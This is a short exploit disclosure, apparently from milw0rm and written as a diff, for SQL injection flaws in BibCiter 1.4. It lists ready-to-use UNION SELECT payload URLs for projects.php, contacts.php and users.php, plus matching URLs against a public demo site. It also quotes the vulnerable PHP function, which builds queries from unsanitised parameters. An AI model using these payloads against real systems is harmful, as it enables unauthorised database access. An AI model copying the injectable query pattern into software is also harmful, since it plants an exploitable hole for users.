@@ -1,0 +1,50 @@
+#BibCiter 1.4 Multiple SQL Injection Vulnerability
+
+
+#Author: nuclear
+
+
+#site:
+http://bibciter.sourceforge.net/
+
+
+#vuln:
+http://localhost/[path]/projects.php?idp=-721) UNION SELECT @@version%23
+http://localhost/[path]/contacts.php?idc=-1) UNION SELECT @@version%23
+http://localhost/[path]/users.php?idu=-1) UNION SELECT @@version%23
+
+
+#demo:
+http://bibciter.net/demo/reports/projects.php?idp=-721)%20UNION%20SELECT%20@@version%23
+http://bibciter.net/demo/reports/contacts.php?idc=-1)%20UNION%20SELECT%20@@version%23
+http://bibciter.net/demo/reports/users.php?idu=-1)%20UNION%20SELECT%20@@version%23
+
+
+#notes:
+watch the title for your query results ^^
+
+
+#description:
+vulnerable function:
+
+function get_vatitle($idregister,$idregistervalue,$nameregister,$tableregister,$pretitle) {
+ $vartitle = "SELECT $nameregister FROM $tableregister WHERE ($idregister=$idregistervalue)";
+ $vartitle = mysql_query($vartitle) or die("error functions_queries line 4");
+ $vartitle = mysql_fetch_array($vartitle);
+ extract($vartitle);
+ $title = $pretitle." &raquo; ".$$nameregister;
+ return $title;
+}
+
+called in these files:
+projects.php;contacts.php;users.php;types_authors.php;bibliographies.php;types_projects.php;
+types_languages.php;types_countries.php;
+
+
+#Special Greets to my bro Mi4night.. ur always the best
+
+
+#greetz Mi4night, cAs, zYzTeM, THE_MAN, Pepe, I-O-W-A, Digitalfortress, DiGitalX, sys32-hack, sys32r, Whitestar
+
+
+# milw0rm.com [2009-01-16]
